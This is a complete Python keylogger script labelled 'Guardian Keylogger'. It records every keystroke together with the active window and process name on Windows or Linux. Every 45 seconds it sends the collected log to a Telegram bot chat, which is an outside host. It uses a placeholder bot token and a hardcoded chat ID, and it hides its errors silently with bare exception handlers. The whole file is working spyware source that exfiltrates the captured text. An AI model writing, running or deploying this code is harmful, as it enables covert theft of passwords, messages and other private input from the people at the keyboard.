import time
import threading
import requests
import os
import platform
import subprocess
from datetime import datetime
from pynput import keyboard

# ============= CONFIG =============
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "-1004320842899"
SEND_INTERVAL = 45
# =================================

log_buffer = ""
last_window = ""
running = True
OS_NAME = platform.system()

def get_active_window_title():
    global OS_NAME
    try:
        if OS_NAME == "Windows":
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                title = win32gui.GetWindowText(hwnd)
                try:
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    proc = psutil.Process(pid)
                    return f"{proc.name()} - {title}"
                except:
                    return title
        elif OS_NAME == "Linux":
            # xdotool for Ubuntu
            title = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"], stderr=subprocess.DEVNULL).decode('utf-8').strip()
            try:
                pid = subprocess.check_output(["xdotool", "getactivewindow", "getpid"], stderr=subprocess.DEVNULL).decode('utf-8').strip()
                proc = subprocess.check_output(["ps", "-p", pid, "-o", "comm="], stderr=subprocess.DEVNULL).decode('utf-8').strip()
                return f"{proc} - {title}"
            except:
                return title
        else:
            return "Unknown OS"
    except:
        return "Unknown"

def send_to_telegram(message):
    if not message.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def flush_buffer():
    global log_buffer
    while running:
        time.sleep(SEND_INTERVAL)
        if log_buffer.strip():
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            header = f"🕒 <b>{ts}</b> | {OS_NAME}\n📱 <b>Window:</b> {last_window or 'N/A'}\n\n"
            send_to_telegram(header + log_buffer)
            log_buffer = ""

def on_press(key):
    global log_buffer, last_window
    try:
        current = get_active_window_title()
        if current != last_window and current != "Unknown":
            last_window = current
            log_buffer += f"\n[→ Window: {current}]\n"
        
        if hasattr(key, 'char') and key.char:
            log_buffer += key.char
        else:
            k = str(key).replace("Key.", "").upper()
            if k == "SPACE": log_buffer += " "
            elif k == "ENTER": log_buffer += " [ENTER]\n"
            elif k == "BACKSPACE": log_buffer += " [←]"
            else: log_buffer += f" [{k}]"
    except:
        log_buffer += " [?]"

def on_release(key):
    if key == keyboard.Key.esc:
        global running
        running = False
        return False

def main():
    print(f"Guardian Keylogger started on {OS_NAME}... (Esc to stop for testing)")
    threading.Thread(target=flush_buffer, daemon=True).start()
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
